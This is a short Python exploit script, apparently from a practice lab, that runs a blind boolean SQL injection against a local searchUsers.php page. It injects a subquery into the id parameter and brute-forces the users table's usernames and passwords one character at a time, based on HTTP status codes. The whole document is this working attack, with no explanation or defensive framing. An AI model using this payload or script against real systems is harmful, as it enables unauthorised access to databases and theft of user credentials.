#!/usr/bin/python3 

import requests
from pwn import * 
import signal 
import sys 
import time 
import string

def def_handler(sig, frame):
    print("\n\[!] Saliendo...\n ")
    sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler)

#Variables globales 
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLi():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Datos extraídos")

    extracted_info = ""

    for position in range(1, 150):
        for character in range(33,126):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
            r = requests.get(sqli_url)
            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break 

if  __name__ == '__main__':

    makeSQLi()